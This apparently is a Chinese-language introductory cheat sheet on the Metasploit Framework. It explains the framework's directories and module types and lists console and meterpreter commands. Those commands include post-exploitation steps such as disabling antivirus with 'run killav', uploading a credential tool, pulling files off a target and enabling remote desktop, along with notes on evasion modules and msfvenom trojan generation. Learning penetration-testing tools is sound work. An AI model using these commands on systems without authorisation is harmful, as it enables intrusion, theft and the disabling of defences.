### 简介

**MSF**

The Metasploit Framework的简称。MSF高度模块化,即框架由多个
module组成,是全球最受欢迎的工具。

是一款开源安全漏洞利用和测试工具,集成了各种平台上常见的溢出漏洞
和流行的shellcode,并持续保持更新。

metasploit涵盖了渗透测试中全过程,你可以在这个框架下利用现有的
Payload进行一系列的渗透测试。

### 目录

data: 包含metasploit用于存储某些漏洞、单词列表、图像等所需二进制文件的可编辑文件。
documentation: 包含框架的可用文档。
lib: metasploit的库文件夹。
plugins: 用来存放metasploit的插件。
scripts: 用来存放metasploit的脚本,包括meterpreter及其它脚本。
tools: 存放多种的命令行实用程序。
modules: 存储metasploit的模块文件。

#### modules目录

auxiliary: 辅助模块, 辅助渗透 (端口扫描、登录密码爆破、漏洞验证等)

exploits: 漏洞利用模块, 包含主流的漏洞利用脚本, 通常是对某些可能存在漏洞的目标进行漏洞利用。命名规则: 操作系统/各种应用协议分类

payloads: 攻击载荷, 主要是攻击成功后在目标机器执行的代码, 比如反弹shell的代码

post: 后渗透阶段模块, 漏洞利用成功获得meterpreter之后, 向目标发送的一些功能性指令, 如: 提权等

encoders: 编码器模块, 主要包含各种编码工具, 对payload进行编码加密, 以便绕过入侵检测和过滤系统

evasion: 躲避模块, 用来生成免杀payload

nops: 由于IDS/IPS会检查数据包中不规则的数据, 在某些情况下, 比如针对溢出攻击, 某些特殊滑行字符串 (NOPS x90x90...) 则会因为被拦截而导致攻击失效。

### 常用命令

show exploits – 查看所有可用的渗透攻击程序代码
show auxiliary – 查看所有可用的辅助攻击工具
[show]options/advanced – 查看该模块可用选项
show payloads – 查看该模块适用的所有载荷代码
show targets - 查看该模块适用的攻击目标类型
search - 根据关键字搜索某模块
info – 显示某模块的详细信息
use - 使用某渗透攻击模块
back - 回退
set/unset - 设置/禁用模块中的某个参数
setg/unsetg - 设置/禁用适用于所有模块的全局参数
save - 将当前设置值保存下来,以便下次启动MSF终端时仍可使用

### meterpreter

meterpreter > background 放回后台
meterpreter > exit 关闭会话
meterpreter > help 帮助信息
meterpreter > sysinfo系统平台信息
meterpreter > screenshot 屏幕截取
meterpreter > shell 命令行shell (exit退出)
meterpreter > getlwd 查看本地目录
meterpreter > Icd 切换本地目录
meterpreter > getwd 查看目录
meterpreter > Is 查看文件目录列表
meterpreter > cd 切换目录
meterpreter > rm 删除文件

meterpreter > download C:\\1.txt 1.txt 下载文件
meterpreter > upload /var/www/wce.exe wce.exe 上传文件
meterpreter > search -d c: -f*.doc 搜索文件
meterpreter > execute -f cmd.exe -i 执行程序/命令
meterpreter > ps 查看进程
meterpreter > getuid 查看当前用户权限
meterpreter > run killav 关闭杀毒软件
meterpreter > run getgui-e 启用远程桌面
meterpreter > portfwd add -I 1234 -p 3389 -r <目标IP> 端口转发

### msfvenom

msfvenom是msfpayload和msfencode的组合。将这两个工具集成在一个框架实例中，
msfvenom是用来生成后门的软件，在目标机上执行后门，在本地监听上线

说白了就是生成木马的。将木马上传到靶机上并执行，拿到meterpreter
